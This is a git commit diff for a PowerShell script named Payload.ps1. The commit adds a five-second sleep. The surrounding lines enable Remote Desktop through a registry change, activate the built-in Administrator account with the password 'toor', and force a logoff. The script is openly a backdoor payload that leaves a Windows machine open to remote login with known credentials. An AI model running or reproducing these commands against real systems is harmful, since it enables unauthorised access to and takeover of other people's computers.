dc75f06a69b378d0599584bbd4a50eae5f06a759
TheDarkNyx <RoyPaz@OutLook.com>
2017-09-06 21:20:47 +0300

    Update Payload.ps1

--- Payload.ps1
+++ Payload.ps1
@@ -1,3 +1,4 @@
+sleep(5)
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 cmd /c "net user Administrator toor /active:yes"
 shutdown -l -f
